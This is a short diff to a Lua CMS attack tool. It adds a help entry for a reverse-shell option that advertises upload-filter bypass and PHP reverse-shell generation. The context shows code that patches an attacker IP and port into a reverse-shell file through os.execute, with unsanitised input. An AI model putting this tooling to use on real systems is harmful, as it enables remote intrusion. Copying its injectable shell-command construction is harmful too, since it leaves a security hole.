@@ -34,12 +34,14 @@ function help()
 		print("-h   	| shows this help and exit")
 		print("-exp 	| Search For available exploits based on version numbers scans")
 		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
+		print("-rv      | Reverse Shell usage[ lua main.lua -rv --bypass to bypass file upload filter ] or [ -rv --generator to generate a php reverse shell]")
 	elseif ( arg[1] == nil or arg[1] == '' )
 	then
 		print("Help Menu:")
 		print("-h   	| shows this help and exit")
 		print("-exp 	| Search For available exploits based on version numbers scans")
 		print("--hidden | Search for hidden content usage [ lua main.lua --hidden <CMS name> ] or  [ lua main.lua --hidden raw]")
+		print("-rv      | Reverse Shell usage[ lua main.lua -rv --bypass to bypass file upload filter ] or [ -rv --generator to generate a php reverse shell]")
 	end
 end
 -- Search for exploits available
@@ -143,6 +145,7 @@ function reverse_shell()
 		os.execute("sed -i \'49s/.*/$ip = " .. "'" .. ip .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && " .. " sed -i \'50s/.*/$port = " .. "'" .. port .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && cat reverse_shells/php-reverse-shell.php > " .. path)
 		print("[:)] Done!")
 		print("[*] Saved to " .. path )
+
 	end
 end
 help()
